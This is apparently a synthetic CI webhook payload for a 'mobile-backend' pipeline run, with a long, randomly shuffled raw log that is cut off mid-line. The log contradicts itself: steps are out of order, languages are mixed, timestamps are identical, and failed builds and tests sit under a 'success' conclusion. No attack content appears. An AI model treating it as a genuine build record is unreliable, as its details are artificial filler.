{
  "action": "completed",
  "workflow_run": {
    "id": 103,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "e05199bde962c5762af9beab17c2b516b1c51ca5",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-14T12:00:19.597054Z",
    "updated_at": "2025-12-14T12:01:56.936892Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "henry"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_staging ===\nCache hit for key-6643\nStep 10/10: Building\n\u2713 lint completed\n  PASS: test_cache_hit (127ms)\nInstalling react@2.7.0\nArtifact uploaded: build.tar.gz (41MB)\nArtifact uploaded: build.tar.gz (37MB)\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 test completed\n[12:00:19] INFO: Processing request\n[12:00:19] ERROR: Connection failed\nStep 5/10: Building\n\u2713 test completed\nCache hit for key-5234\nStep 5/10: Building\nCompiling src/utils.go...\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: build.tar.gz (13MB)\n\u2713 lint completed\nStep 6/10: Building\n  PASS: test_user_create (267ms)\n\u2713 test completed\nWARNING: lodash has known vulnerabilities\n[12:00:19] INFO: Processing request\n[12:00:19] WARN: Deprecated API usage\nCache hit for key-8289\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-9107\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:19] INFO: Processing request\nCache hit for key-8824\n  PASS: test_user_create (237ms)\nStep 1/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (15MB)\nCompiling src/main.py...\nInstalling webpack@5.9.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-6859\nInstalling eslint@4.14.0\nCompiling src/app.ts...\n[12:00:19] WARN: Deprecated API usage\n\u2713 lint completed\nCache hit for key-7651\n[12:00:19] INFO: Processing request\nCache hit for key-6116\n[12:00:19] WARN: Deprecated API usage\nCache hit for key-4181\n  PASS: test_auth_login (400ms)\nInstalling axios@5.7.0\n  PASS: test_auth_login (358ms)\nCompiling src/service.java...\nWARNING: prettier has known vulnerabilities\n  PASS: test_api_health (326ms)\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_user_create (348ms)\n\u2713 lint completed\n\u2713 lint completed\n[12:00:19] INFO: Processing request\n  PASS: test_db_connect (333ms)\nArtifact uploaded: build.tar.gz (1MB)\nArtifact uploaded: build.tar.gz (41MB)\nCompiling src/index.js...\nException: NullPointerException\nWARNING: lodash has known vulnerabilities\nInstalling prettier@1.4.0\n  PASS: test_db_connect (482ms)\nCache hit for key-5287\nInstalling eslint@1.4.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 10/10: Building\nCache hit for key-7770\nInstalling lodash@1.10.0\n\u2713 test completed\nCompiling src/utils.go...\nCompiling src/handler.rs...\nCompiling src/utils.go...\nException: RuntimeError\n  PASS: test_auth_login (365ms)\n\u2717 build failed with exit code 80\n\u2713 build completed\nCompiling src/service.java...\nCompiling src/handler.rs...\n\u2713 build completed\n\u2713 lint completed\n\u2717 build failed with exit code 104\nCompiling src/main.py...\n[12:00:19] INFO: Processing request\n=== Step deploy_staging completed ===\n=== Step: lint ===\n  PASS: test_auth_login (281ms)\n  PASS: test_auth_login (364ms)\nArtifact uploaded: build.tar.gz (8MB)\n[12:00:19] INFO: Processing request\nStep 3/10: Building\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (15MB)\nInstalling jest@1.19.0\nArtifact uploaded: build.tar.gz (5MB)\nCache hit for key-2713\nCache hit for key-1202\nInstalling axios@4.1.0\n\u2713 build completed\nCompiling src/service.java...\nCache hit for key-3331\nStep 6/10: Building\nCompiling src/handler.rs...\nCompiling src/utils.go...\nCompiling src/handler.rs...\n[12:00:19] INFO: Processing request\n  PASS: test_auth_login (38ms)\n\u2713 test completed\nInstalling prettier@1.4.0\n\u2713 build completed\nCompiling src/main.py...\n[12:00:19] ERROR: Connection failed\nInstalling express@2.12.0\n[12:00:19] INFO: Processing request\n  PASS: test_api_health (433ms)\n  PASS: test_db_connect (324ms)\nArtifact uploaded: build.tar.gz (50MB)\nCompiling src/index.js...\n[12:00:19] INFO: Processing request\n  PASS: test_auth_login (76ms)\n[12:00:19] INFO: Processing request\nInstalling express@1.18.0\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (17MB)\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (49MB)\nStep 3/10: Building\n[12:00:19] INFO: Processing request\nCompiling src/index.js...\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\nArtifact uploaded: build.tar.gz (49MB)\nArtifact uploaded: build.tar.gz (11MB)\nStep 1/10: Building\nCache hit for key-1382\nStep 10/10: Building\nInstalling express@5.2.0\n[12:00:19] INFO: Processing request\nInstalling jest@5.3.0\nInstalling eslint@5.7.0\nException: RuntimeError\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 test completed\nCache hit for key-8708\n  PASS: test_db_connect (453ms)\n\u2713 test completed\nCompiling src/service.java...\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (38MB)\nInstalling lodash@1.19.0\n[12:00:19] INFO: Processing request\nCache hit for key-2120\nInstalling jest@3.12.0\n[12:00:19] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (37MB)\nStep 8/10: Building\nInstalling eslint@1.8.0\n[12:00:19] INFO: Processing request\n\u2713 test completed\nInstalling webpack@5.12.0\n[12:00:19] INFO: Processing request\n\u2713 build completed\nInstalling react@2.13.0\n[12:00:19] INFO: Processing request\nCompiling src/utils.go...\n\u2713 lint completed\nCompiling src/app.ts...\nInstalling webpack@3.11.0\nInstalling express@1.18.0\nArtifact uploaded: build.tar.gz (22MB)\n  PASS: test_user_create (211ms)\nInstalling prettier@2.11.0\n[12:00:19] INFO: Processing request\n  PASS: test_api_health (54ms)\nCompiling src/handler.rs...\nStep 4/10: Building\n\u2713 lint completed\n=== Step lint completed ===\n=== Step: unit_tests ===\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (2MB)\nWARNING: webpack has known vulnerabilities\n  PASS: test_api_health (176ms)\nInstalling prettier@4.8.0\nFAILED: test_db_connect\n\u2713 lint completed\nCompiling src/handler.rs...\nStep 9/10: Building\nCache hit for key-9444\n  PASS: test_api_health (420ms)\nInstalling prettier@2.15.0\nCache hit for key-7030\nArtifact uploaded: build.tar.gz (7MB)\n\u2713 build completed\n\u2713 lint completed\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (4MB)\nStep 7/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (38MB)\n\u2713 build completed\n[12:00:19] INFO: Processing request\nStep 9/10: Building\n[12:00:19] INFO: Processing request\n  PASS: test_user_create (73ms)\n\u2713 test completed\nWARNING: lodash has known vulnerabilities\nCache hit for key-8949\n[12:00:19] INFO: Processing request\n  PASS: test_auth_login (186ms)\n  PASS: test_cache_hit (20ms)\n  PASS: test_user_create (68ms)\nCompiling src/index.js...\n[12:00:19] WARN: Deprecated API usage\nStep 5/10: Building\nCompiling src/handler.rs...\nStep 5/10: Building\n  PASS: test_api_health (427ms)\n  PASS: test_auth_login (306ms)\nArtifact uploaded: build.tar.gz (38MB)\nCompiling src/main.py...\n\u2713 build completed\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (50MB)\nInstalling jest@5.18.0\n  PASS: test_api_health (46ms)\nStep 10/10: Building\n  PASS: test_db_connect (446ms)\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\n\u2717 build failed with exit code 121\n\u2717 build failed with exit code 56\nCache hit for key-1644\n  PASS: test_auth_login (23ms)\n[12:00:19] INFO: Processing request\nInstalling jest@3.20.0\nStep 8/10: Building\nCache hit for key-2320\n  PASS: test_cache_hit (326ms)\n[12:00:19] INFO: Processing request\nCompiling src/utils.go...\n\u2713 lint completed\n\u2713 test completed\nArtifact uploaded: build.tar.gz (29MB)\nCache hit for key-2957\nInstalling lodash@3.12.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (12MB)\n  PASS: test_user_create (27ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 9/10: Building\nInstalling prettier@5.2.0\nArtifact uploaded: build.tar.gz (3MB)\nInstalling express@1.1.0\nInstalling express@3.8.0\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (42MB)\nWARNING: lodash has known vulnerabilities\n[12:00:19] WARN: Deprecated API usage\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\n\u2713 lint completed\nStep 7/10: Building\nCache hit for key-8867\n[12:00:19] ERROR: Connection failed\nCache hit for key-3346\nCompiling src/main.py...\n\u2713 test completed\n=== Step unit_tests completed ===\n=== Step: save_cache ===\nStep 6/10: Building\n\u2713 test completed\n[12:00:19] INFO: Processing request\nStep 6/10: Building\nInstalling eslint@5.6.0\nArtifact uploaded: build.tar.gz (43MB)\nStep 7/10: Building\nInstalling webpack@3.3.0\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (5MB)\nCompiling src/service.java...\nCache hit for key-3811\nCache hit for key-6960\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (46MB)\n[12:00:19] INFO: Processing request\nCache hit for key-8532\nCompiling src/utils.go...\nInstalling prettier@2.5.0\n  PASS: test_auth_login (491ms)\nCache hit for key-8124\nCache hit for key-4104\n[12:00:19] INFO: Processing request\nStep 8/10: Building\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (5MB)\nCache hit for key-1787\nStep 9/10: Building\nCache hit for key-2048\n[12:00:19] WARN: Deprecated API usage\nCache hit for key-3510\n[12:00:19] INFO: Processing request\n\u2713 test completed\nCompiling src/utils.go...\nCompiling src/service.java...\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-3393\nCompiling src/app.ts...\nWARNING: eslint has known vulnerabilities\nInstalling jest@2.4.0\n  PASS: test_api_health (14ms)\nInstalling axios@4.11.0\nCompiling src/utils.go...\nInstalling lodash@5.19.0\nCache hit for key-2231\nStep 3/10: Building\n  PASS: test_cache_hit (171ms)\nInstalling jest@4.2.0\nCompiling src/app.ts...\n[12:00:19] INFO: Processing request\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (20MB)\nInstalling prettier@1.11.0\nCache hit for key-5949\nStep 10/10: Building\nCache hit for key-2037\nStep 3/10: Building\nWARNING: jest has known vulnerabilities\nCache hit for key-6128\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_cache_hit (345ms)\nArtifact uploaded: build.tar.gz (20MB)\n  PASS: test_user_create (6ms)\nStep 1/10: Building\nCompiling src/app.ts...\n[12:00:19] INFO: Processing request\nCompiling src/index.js...\nCompiling src/main.py...\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (42MB)\nInstalling jest@3.13.0\n[12:00:19] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/handler.rs...\nCache hit for key-1670\n  PASS: test_user_create (73ms)\nCache hit for key-2572\nStep 4/10: Building\nCache hit for key-3583\nCache hit for key-9794\n[12:00:19] INFO: Processing request\nCompiling src/main.py...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (34MB)\nInstalling webpack@4.8.0\n\u2713 test completed\nCompiling src/main.py...\nCompiling src/main.py...\nFAILED: test_user_create\nException: ValueError\n=== Step save_cache completed ===\n=== Step: type_check ===\nCompiling src/index.js...\n[12:00:19] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: react has known vulnerabilities\n  PASS: test_auth_login (101ms)\nArtifact uploaded: build.tar.gz (10MB)\nInstalling prettier@3.11.0\n[12:00:19] WARN: Deprecated API usage\n[12:00:19] INFO: Processing request\nInstalling webpack@5.14.0\nStep 2/10: Building\nCompiling src/service.java...\nCache hit for key-3874\n  PASS: test_db_connect (352ms)\nCache hit for key-4825\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling axios@4.6.0\nArtifact uploaded: build.tar.gz (8MB)\n\u2713 build completed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (12MB)\nStep 5/10: Building\nInstalling axios@3.6.0\nCompiling src/main.py...\nCache hit for key-3274\n[12:00:19] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (35MB)\nStep 1/10: Building\nCompiling src/service.java...\nCache hit for key-2760\n\u2713 lint completed\nCache hit for key-2223\nCompiling src/index.js...\nStep 4/10: Building\nStep 6/10: Building\nCache hit for key-3817\nArtifact uploaded: build.tar.gz (40MB)\nCache hit for key-5781\nStep 1/10: Building\nInstalling jest@1.4.0\nCache hit for key-7665\nWARNING: express has known vulnerabilities\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (11MB)\nCache hit for key-2936\nCache hit for key-6017\n[12:00:19] INFO: Processing request\nFAILED: test_api_health\nArtifact uploaded: build.tar.gz (5MB)\nStep 1/10: Building\n[12:00:19] INFO: Processing request\nCache hit for key-7364\nStep 3/10: Building\nInstalling express@1.11.0\n  PASS: test_db_connect (490ms)\nArtifact uploaded: build.tar.gz (33MB)\n\u2713 build completed\nInstalling lodash@4.14.0\n[12:00:19] INFO: Processing request\nCache hit for key-6915\n[12:00:19] INFO: Processing request\nInstalling lodash@3.7.0\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (13MB)\nStep 6/10: Building\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (6MB)\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (15MB)\nCompiling src/app.ts...\n\u2713 test completed\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (5MB)\nStep 5/10: Building\nStep 8/10: Building\n\u2713 lint completed\n[12:00:19] INFO: Processing request\nStep 10/10: Building\nCache hit for key-6790\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nCache hit for key-2721\n  PASS: test_auth_login (376ms)\n[12:00:19] INFO: Processing request\nCompiling src/handler.rs...\n[12:00:19] INFO: Processing request\n  PASS: test_api_health (485ms)\nInstalling lodash@5.1.0\nStep 2/10: Building\nCache hit for key-4640\n=== Step type_check completed ===\n=== Step: setup_environment ===\n\u2713 build completed\n[12:00:19] WARN: Deprecated API usage\n\u2717 build failed with exit code 113\n[12:00:19] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_auth_login (277ms)\nInstalling express@5.20.0\nCache hit for key-5410\nCompiling src/service.java...\nStep 10/10: Building\nInstalling webpack@5.10.0\nStep 6/10: Building\nCompiling src/utils.go...\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (4MB)\nInstalling webpack@2.16.0\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (32MB)\n  PASS: test_user_create (97ms)\n[12:00:19] WARN: Deprecated API usage\n[12:00:19] INFO: Processing request\n\u2717 build failed with exit code 104\nCache hit for key-9742\nInstalling eslint@2.8.0\nCompiling src/utils.go...\nCache hit for key-7031\n\u2713 lint completed\n  PASS: test_user_create (23ms)\nArtifact uploaded: build.tar.gz (8MB)\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (31MB)\n[12:00:19] WARN: Deprecated API usage\n[12:00:19] INFO: Processing request\nCompiling src/main.py...\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (22MB)\nCompiling src/utils.go...\nInstalling prettier@4.5.0\nCache hit for key-1345\nInstalling axios@1.19.0\nCompiling src/service.java...\nInstalling axios@3.1.0\n[12:00:19] INFO: Processing request\nStep 7/10: Building\nCache hit for key-9380\nCompiling src/index.js...\nCompiling src/utils.go...\nCompiling src/main.py...\nInstalling axios@3.5.0\nCompiling src/handler.rs...\nCompiling src/main.py...\nStep 10/10: Building\n  PASS: test_cache_hit (244ms)\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (7MB)\n\u2713 build completed\nCache hit for key-4146\nInstalling eslint@4.6.0\nStep 9/10: Building\nCompiling src/index.js...\nStep 2/10: Building\n\u2713 lint completed\nStep 2/10: Building\nInstalling express@1.19.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (8MB)\nCompiling src/app.ts...\n[12:00:19] INFO: Processing request\n  PASS: test_user_create (96ms)\nCompiling src/app.ts...\nCompiling src/index.js...\nInstalling axios@3.19.0\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:19] INFO: Processing request\nInstalling react@2.7.0\n[12:00:19] INFO: Processing request\nCache hit for key-1906\nCompiling src/handler.rs...\n[12:00:19] INFO: Processing request\n\u2713 build completed\nCache hit for key-4408\n\u2713 build completed\n  PASS: test_api_health (323ms)\nInstalling eslint@3.13.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:19] WARN: Deprecated API usage\n=== Step setup_environment completed ===\n=== Step: e2e_tests ===\nArtifact uploaded: build.tar.gz (23MB)\n\u2717 build failed with exit code 121\nCache hit for key-9822\n  PASS: test_api_health (192ms)\n[12:00:19] INFO: Processing request\nStep 9/10: Building\nCache hit for key-8873\nArtifact uploaded: build.tar.gz (5MB)\nInstalling express@1.1.0\nCompiling src/handler.rs...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (14MB)\nArtifact uploaded: build.tar.gz (25MB)\nInstalling express@1.2.0\nArtifact uploaded: build.tar.gz (27MB)\nWARNING: jest has known vulnerabilities\nCache hit for key-4100\n\u2713 build completed\nStep 2/10: Building\nCompiling src/utils.go...\nWARNING: webpack has known vulnerabilities\n[12:00:19] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 test completed\nException: TypeError\nCache hit for key-5866\nInstalling axios@3.8.0\nArtifact uploaded: build.tar.gz (32MB)\nException: ValueError\nStep 4/10: Building\n\u2713 test completed\nCache hit for key-1596\nCache hit for key-2539\nStep 5/10: Building\nCompiling src/service.java...\nCompiling src/app.ts...\nCache hit for key-6655\nStep 8/10: Building\nInstalling prettier@5.10.0\n  PASS: test_cache_hit (497ms)\nInstalling jest@5.19.0\n  PASS: test_cache_hit (335ms)\n  PASS: test_auth_login (456ms)\nInstalling jest@5.19.0\nStep 8/10: Building\nCache hit for key-9763\n[12:00:19] INFO: Processing request\nCache hit for key-5594\nStep 5/10: Building\nWARNING: react has known vulnerabilities\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (40MB)\nInstalling prettier@5.20.0\nWARNING: webpack has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 test completed\nCache hit for key-4134\n  PASS: test_db_connect (351ms)\n  PASS: test_cache_hit (265ms)\n\u2713 lint completed\nStep 4/10: Building\nCompiling src/handler.rs...\nInstalling webpack@2.16.0\nStep 1/10: Building\n  PASS: test_user_create (431ms)\n[12:00:19] INFO: Processing request\nWARNING: axios has known vulnerabilities\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (2MB)\nInstalling axios@4.16.0\nInstalling jest@5.9.0\n\u2713 lint completed\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (22MB)\n[12:00:19] WARN: Deprecated API usage\nException: NullPointerException\nArtifact uploaded: build.tar.gz (27MB)\nInstalling webpack@1.2.0\nCache hit for key-1405\nCache hit for key-2617\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\n  PASS: test_db_connect (433ms)\nArtifact uploaded: build.tar.gz (13MB)\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nStep 7/10: Building\nStep 1/10: Building\n\u2713 build completed\n=== Step e2e_tests completed ===\n=== Step: restore_cache ===\nCompiling src/main.py...\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: build.tar.gz (2MB)\n[12:00:19] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (19MB)\nStep 10/10: Building\nStep 3/10: Building\n  PASS: test_db_connect (462ms)\nArtifact uploaded: build.tar.gz (45MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (13MB)\nArtifact uploaded: build.tar.gz (6MB)\nCache hit for key-9511\nStep 2/10: Building\n[12:00:19] INFO: Processing request\nInstalling webpack@2.12.0\n  PASS: test_api_health (482ms)\n[12:00:19] WARN: Deprecated API usage\n\u2713 test completed\n\u2713 build completed\nFAILED: test_user_create\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_db_connect (202ms)\nStep 5/10: Building\nInstalling lodash@3.9.0\nInstalling express@5.20.0\nArtifact uploaded: build.tar.gz (14MB)\n\u2713 test completed\n[12:00:19] INFO: Processing request\n  PASS: test_api_health (348ms)\n\u2713 build completed\nStep 8/10: Building\nInstalling prettier@1.9.0\nArtifact uploaded: build.tar.gz (42MB)\nInstalling webpack@5.7.0\nInstalling eslint@5.0.0\n  PASS: test_cache_hit (393ms)\n\u2713 build completed\nStep 9/10: Building\nCompiling src/index.js...\nCompiling src/handler.rs...\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (38MB)\n  PASS: test_db_connect (160ms)\n  PASS: test_user_create (118ms)\nInstalling prettier@4.14.0\nInstalling eslint@1.13.0\nCompiling src/main.py...\nCompiling src/main.py...\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling lodash@3.10.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (47MB)\nCache hit for key-1932\n\u2713 test completed\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: test_api_health (89ms)\n\u2713 test completed\nStep 6/10: Building\nCompiling src/handler.rs...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (27MB)\n  PASS: test_user_create (315ms)\nCache hit for key-2998\n  PASS: test_db_connect (306ms)\n[12:00:19] INFO: Processing request\nWARNING: eslint has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:19] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:19] INFO: Processing request\n\u2713 test completed\n  PASS: test_auth_login (419ms)\n\u2713 build completed\nWARNING: react has known vulnerabilities\nCompiling src/utils.go...\n[12:00:19] INFO: Processing request\n  PASS: test_cache_hit (96ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 test completed\nStep 2/10: Building\n\u2713 build completed\nInstalling axios@1.0.0\nStep 1/10: Building\n[12:00:19] INFO: Processing request\nCache hit for key-4420\nArtifact uploaded: build.tar.gz (38MB)\nArtifact uploaded: build.tar.gz (9MB)\nCache hit for key-9452\n=== Step restore_cache completed ===\n=== Step: deploy_production ===\n\u2713 build completed\n[12:00:19] INFO: Processing request\nWARNING: react has known vulnerabilities\n\u2713 lint completed\nStep 3/10: Building\nCompiling src/index.js...\nException: NullPointerException\nCompiling src/index.js...\nCache hit for key-5264\nStep 4/10: Building\n[12:00:19] INFO: Processing request\nCompiling src/utils.go...\nCompiling src/main.py...\nCompiling src/service.java...\nInstalling prettier@2.6.0\n\u2713 lint completed\nCache hit for key-3483\nCache hit for key-6775\nCompiling src/service.java...\n[12:00:19] INFO: Processing request\nStep 6/10: Building\n\u2713 build completed\nStep 5/10: Building\nCompiling src/index.js...\n\u2713 test completed\n  PASS: test_db_connect (254ms)\n\u2713 lint completed\nCompiling src/main.py...\n  PASS: test_user_create (109ms)\nInstalling eslint@2.9.0\nCompiling src/service.java...\nCompiling src/index.js...\n[12:00:19] INFO: Processing request\nStep 9/10: Building\nInstalling webpack@4.13.0\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (31MB)\n[12:00:19] INFO: Processing request\nWARNING: webpack has known vulnerabilities\nFAILED: test_db_connect\n  PASS: test_user_create (118ms)\nCache hit for key-4696\n\u2713 build completed\n\u2713 lint completed\n\u2713 test completed\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (28MB)\nCache hit for key-5666\nStep 1/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (2MB)\nCompiling src/index.js...\nCompiling src/service.java...\nInstalling express@3.19.0\n[12:00:19] INFO: Processing request\nCompiling src/service.java...\nStep 7/10: Building\n\u2713 test completed\nCache hit for key-7277\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling jest@3.19.0\nInstalling jest@4.11.0\n[12:00:19] WARN: Deprecated API usage\nStep 6/10: Building\n[12:00:19] INFO: Processing request\nCache hit for key-6175\n\u2713 lint completed\nCache hit for key-7563\nCompiling src/index.js...\n\u2713 test completed\nCache hit for key-7473\nCache hit for key-6739\n[12:00:19] INFO: Processing request\nInstalling webpack@4.20.0\nStep 2/10: Building\nStep 9/10: Building\nInstalling lodash@3.5.0\nCache hit for key-3288\nArtifact uploaded: build.tar.gz (10MB)\nCache hit for key-2772\nCompiling src/main.py...\n\u2713 lint completed\nCompiling src/utils.go...\n\u2713 lint completed\nStep 4/10: Building\n\u2713 lint completed\n\u2713 lint completed\nInstalling axios@4.0.0\n  PASS: test_auth_login (433ms)\n  PASS: test_auth_login (105ms)\n=== Step deploy_production completed ===\n=== Step: checkout ===\nArtifact uploaded: build.tar.gz (27MB)\nInstalling react@1.8.0\n  PASS: test_cache_hit (156ms)\nInstalling axios@4.12.0\nCache hit for key-4107\nArtifact uploaded: build.tar.gz (22MB)\nCache hit for key-5522\nArtifact uploaded: build.tar.gz (27MB)\nStep 7/10: Building\n[12:00:19] INFO: Processing request\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (39MB)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (14MB)\nCache hit for key-3882\nStep 9/10: Building\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (16MB)\nCompiling src/service.java...\n\u2713 test completed\nCache hit for key-9636\n  PASS: test_cache_hit (148ms)\nCompiling src/handler.rs...\n[12:00:19] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:19] INFO: Processing request\n\u2713 lint completed\nWARNING: react has known vulnerabilities\nCompiling src/handler.rs...\nCompiling src/main.py...\n  PASS: test_cache_hit (44ms)\nCache hit for key-6361\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\n\u2713 test completed\nInstalling express@3.9.0\nCache hit for key-4446\nCompiling src/handler.rs...\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 lint completed\nCompiling src/app.ts...\n  PASS: test_auth_login (437ms)\nArtifact uploaded: build.tar.gz (22MB)\nArtifact uploaded: build.tar.gz (40MB)\n  PASS: test_db_connect (88ms)\nInstalling react@2.6.0\n  PASS: test_api_health (186ms)\nArtifact uploaded: build.tar.gz (48MB)\n[12:00:19] INFO: Processing request\nInstalling jest@1.17.0\nCache hit for key-4090\nInstalling webpack@1.17.0\n\u2713 build completed\nStep 9/10: Building\nStep 2/10: Building\n  PASS: test_db_connect (396ms)\nCache hit for key-1810\nArtifact uploaded: build.tar.gz (1MB)\nInstalling react@5.16.0\nCache hit for key-6391\n\u2713 build completed\nCompiling src/handler.rs...\n[12:00:19] INFO: Processing request\nCache hit for key-5481\nCompiling src/main.py...\nCompiling src/main.py...\nCache hit for key-1555\nStep 6/10: Building\nCache hit for key-1019\nArtifact uploaded: build.tar.gz (40MB)\nStep 4/10: Building\n  PASS: test_auth_login (482ms)\n\u2713 test completed\nStep 6/10: Building\n\u2713 lint completed\nInstalling eslint@3.20.0\nInstalling webpack@5.14.0\n\u2713 test completed\nInstalling lodash@3.19.0\nInstalling lodash@1.16.0\n\u2713 build completed\nInstalling express@4.14.0\nStep 6/10: Building\nStep 7/10: Building\nInstalling prettier@1.8.0\nArtifact uploaded: build.tar.gz (40MB)\nInstalling eslint@2.12.0\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/utils.go...\n[12:00:19] INFO: Processing request\n=== Step checkout completed ===\n=== Step: integration_tests ===\n[12:00:19] INFO: Processing request\nStep 5/10: Building\nInstalling express@2.7.0\n\u2713 test completed\nInstalling prettier@3.4.0\nCompiling src/service.java...\nCompiling src/main.py...\nStep 8/10: Building\n  PASS: test_api_health (244ms)\n  PASS: test_cache_hit (310ms)\n\u2717 build failed with exit code 108\nCompiling src/main.py...\n  PASS: test_api_health (264ms)\n[12:00:19] INFO: Processing request\nCompiling src/utils.go...\n[12:00:19] INFO: Processing request\nCache hit for key-5429\n[12:00:19] INFO: Processing request\nStep 6/10: Building\nWARNING: express has known vulnerabilities\nStep 1/10: Building\nCache hit for key-1593\n  PASS: test_api_health (222ms)\nInstalling prettier@2.16.0\n  PASS: test_api_health (374ms)\nStep 6/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (28MB)\n[12:00:19] INFO: Processing request\nCache hit for key-2000\nInstalling express@1.9.0\n[12:00:19] INFO: Processing request\nInstalling axios@5.2.0\nInstalling axios@5.20.0\n  PASS: test_api_health (38ms)\nArtifact uploaded: build.tar.gz (3MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling express@5.1.0\nArtifact uploaded: build.tar.gz (5MB)\nStep 2/10: Building\n  PASS: test_db_connect (472ms)\nStep 6/10: Building\n[12:00:19] INFO: Processing request\nStep 8/10: Building\n  PASS: test_user_create (365ms)\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (41MB)\nArtifact uploaded: build.tar.gz (48MB)\nArtifact uploaded: build.tar.gz (4MB)\n  PASS: test_user_create 